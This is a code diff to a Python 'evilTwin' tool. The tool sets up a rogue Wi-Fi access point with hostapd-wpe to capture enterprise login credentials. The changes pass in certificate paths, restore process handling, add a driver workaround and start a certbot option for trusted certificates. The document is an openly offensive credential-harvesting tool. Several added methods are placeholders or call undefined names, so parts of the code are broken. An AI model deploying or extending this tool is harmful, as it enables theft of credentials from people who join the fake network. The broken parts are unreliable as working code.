@@ -13,7 +13,8 @@ except Exception as e:
 
 class evilTwin(threading.Thread):
 	def __init__(self, interface, ssid, channel, macaddress, \
-	 certname, country, state, city, company, ou, email):
+	 certname, server_cert, private_key,\
+	 country, state, city, company, ou, email):
 		threading.Thread.__init__(self)
 		self.setDaemon(0) # Creates thread in non-daemon mode
 		self.interface = interface
@@ -28,27 +29,31 @@ class evilTwin(threading.Thread):
 		self.company = company
 		self.ou = ou
 		self.email = email
-		self.server_cert = 'data/certs/server_cert.pem'
-		self.private_key = 'data/certs/private_key.pem'
+		self.server_cert = server_cert
+		self.private_key = private_key
 
 	def run(self):
 		self.sslCert(self.country, self.state, self.city, self.company, self.ou, self.certname, self.email)
 		self.dependency_check()
 		self.hostapd_config()
 		self.sanity_check()
-		time.sleep(1)
+		time.sleep(1.5)
 		p1 = Popen(['hostapd-wpe', 'data/hostapd-wpe/hostapd-wpe.conf'], stdout=PIPE)
-		print('[i] Real-time hostapd-wpe logs below:\n')
-		for line in iter(p1.stdout.readline, ''):
-		    sys.stdout.write(line)
-		    # f.write(line)
+		print('\n[i] Real-time hostapd-wpe logs below:\n')
+		counter = 0
+		if counter <= 5:
+			for line in iter(p1.stdout.readline, ''):
+				counter+=1
+				sys.stdout.write(line)
+				# f.write(line)
 		
 		# Obtain hostapd-wpe Process ID
-		# global eviltwin_pid
-		# eviltwin_pid=p1.pid
-		# raw_input(red('!') + 'Press Enter to close\n\n')
-		# # Send the signal terminate HTTPS Serverprocess
-		# os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
+		global eviltwin_pid
+		eviltwin_pid=p1.pid
+		raw_input(red('!') + 'Press Enter to quit\n\n')
+		# Send the signal terminate HTTPS Serverprocess
+		os.kill(os.getpgid(eviltwin_pid), signal.SIGTERM)
+		# self.driver_fix()
 	
 	def dependency_check(self):
 		'''Checks if hostapd-wpe is installed, if not installs it'''
@@ -66,9 +71,16 @@ class evilTwin(threading.Thread):
 			print('\n')
 			# print(p2.communicate())
 	
+	def create_folder(self):
+		print('Create data/certs & data/hostapd-wpe folder')
+
 	def sanity_check(self):
 		'''Terminates conflicting processes'''
 		p1 = Popen(['airmon-ng','check','kill'], stdout=PIPE)
+
+	def driver_fix(self):
+		p1 = Popen(['iwpriv', 'wlan0', 'reset', '0'], stdout=PIPE)
+
 
 	def fix_broken_package(self):
 		'''Fixes broken hostapd-wpe packages'''
@@ -76,6 +88,8 @@ class evilTwin(threading.Thread):
 		os.system('apt-get update')
 		os.system('apt-get install hostapd-wpe')
 		#/var/run/hostapd-wpe/wlan0
+		# iwpriv wlan0 reset 0; and if that is not
+		# enough, change 0 to 1
 
 	def hostapd_config(self):
 		'''Creates hostadp-wpe config file based of parameter values'''
@@ -86,6 +100,8 @@ class evilTwin(threading.Thread):
 
 		# Lines to modify in hostapd-wpe config file
 		data[3] = 'interface=%s\n' % (self.wirelessInt)
+		# TESTING DRIVER BUG
+		data[1] = 'driver=nl80211\n'
 		data[14]= 'ssid=%s\n' % (self.ssid)
 		data[15]= 'channel=%s\n' % (self.channel)
 		data[8] = 'server_cert=%s\n' % (self.server_cert)
@@ -131,4 +147,33 @@ class evilTwin(threading.Thread):
 		p1.wait()
 		# for line in iter(p1.stdout.readline, ''):
 		#     sys.stdout.write(line)
-		print(green('*') + 'New SSL Certificate Created:')
+		# print(green('*') + 'TLS/SSL Certificate Successfully Created')
+
+	def grab_internal_ip(self):
+		print('Place holder')
+
+	def grab_external_ip(self):
+		print('Place holder')
+
+	def certbot_dependency_check(self):
+		print('Place Holder')
+		if True:
+			print('continue')
+		else:
+			return False
+			sys.exit(1)
+
+
+	def certbot(self):
+		self.dependency_check_certbot()
+		if args == 'certbot':
+			print('run certbot, ignore OpenSSL')
+			print('Ensure Port 80 is forwarded from Internal <IP> to external <IP>')
+			print('Create DNS A record for '+ self.certname + ' pointing to external <IP>')
+			raw_input('Ready?')
+			p1 = Popen(["certbot certonly --standalone --preferred-challenges http -d" + self.certname], stdout=PIPE)
+			print('Saving Certs to: data/certs/live/DOMAIN/')
+			self.server_cert = 'data/certs/live/DOMAIN'
+			self.private_key = 'data/certs/live/DOMAIN'
+		else:
+			print('Run OpenSSL')
